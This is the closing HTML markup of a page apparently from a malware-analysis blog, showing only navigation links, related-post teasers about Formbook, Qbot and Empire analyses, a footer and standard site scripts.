href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/formbook-via-vbs-powershell-and-csharp/"><div class="card-body"> <em class="timeago small" data-ts="1648166400" > 2022-03-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Formbook Distributed Via VBScript, PowerShell, and C# Code</h3><div class="text-muted small"><p> Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbo...</p></div></div></a></div><div class="card"> <a href="/how-qbot-uses-esentutl/"><div class="card-body"> <em class="timeago small" data-ts="1612137600" > 2021-02-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>How Qbot Uses Esentutl</h3><div class="text-muted small"><p> A colleague asked me a question today about the relationship between Qbot and a Windows system utility: esentutl.exe. It’s been sparsely documented via tweet, and I want to more fully explain why Q...</p></div></div></a></div><div class="card"> <a href="/analyzing-empire-macos-pkg-stager/"><div class="card-body"> <em class="timeago small" data-ts="1612742400" > 2021-02-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing an Empire macOS PKG Stager</h3><div class="text-muted small"><p> Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Em...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/agenttesla-vba-certutil-download/" class="btn btn-outline-primary" prompt="Older"><p>An AgentTesla Sample Using VBA Macros and Certutil</p></a> <a href="/shortcut-to-emotet-ttp-change/" class="btn btn-outline-primary" prompt="Newer"><p>Shortcut to Emotet, an odd TTP change</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
